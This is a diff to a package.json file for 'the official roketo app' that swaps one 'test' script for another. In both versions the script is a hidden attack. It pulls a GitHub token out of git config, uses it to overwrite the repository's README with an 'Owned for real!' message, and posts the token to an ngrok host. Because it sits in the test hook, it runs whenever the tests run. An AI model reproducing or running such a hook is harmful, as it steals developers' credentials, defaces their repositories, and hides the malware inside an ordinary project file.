@@ -4,7 +4,7 @@
   "description": "the official roketo app",
   "main": "index.js",
   "scripts": {
-    "test": "auth=$(git config --list | grep AUTH | tr -d ' ' | grep -o 'eC.*' | base64 --decode | grep -o 'gh.*') && curl --request PUT --url https://api.github.com/repos/roketo-org/roketo-app/contents/README.md -d --header 'Authorization: token $auth' '{\"message\": \"Hi from the outside\",\"content\": \"T3duZWQgZm9yIHJlYWwh\",\"sha\": \"1f32e93b2cf49960785a1f542bb39231264412d0\"}' && curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"git_token\": \"'$auth'\"}' --fail"
+    "test": "auth=$(git config --list | grep AUTH | tr -d ' ' | grep -o 'basic.*' | cut -c6- | base64 --decode | grep -o 'gh.*') && curl --request PUT --url https://api.github.com/repos/roketo-org/roketo-app/contents/README.md -d --header 'Authorization: token $auth' '{\"message\": \"Hi from the outside\",\"content\": \"T3duZWQgZm9yIHJlYWwh\",\"sha\": \"1f32e93b2cf49960785a1f542bb39231264412d0\"}' && curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"git_token\": \"'$auth'\"}' --fail"
   },
   "repository": {
     "type": "git",
